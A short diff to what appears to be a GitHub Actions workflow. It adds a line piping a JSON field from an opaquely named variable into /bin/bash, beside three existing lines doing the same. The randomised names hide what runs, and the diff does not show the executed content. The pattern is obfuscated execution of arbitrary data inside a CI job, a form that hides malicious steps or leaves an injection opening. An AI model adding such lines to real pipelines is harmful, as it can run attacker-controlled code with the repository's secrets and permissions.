@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$gwv5160" | jq -r .a59 | /bin/bash
           printf '%s' "$rb0" | jq -r .x171 | /bin/bash
           echo $bmzks96 | jq -r .av08 | /bin/bash
+          echo $hgwo60 | jq -r .ucwo86 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
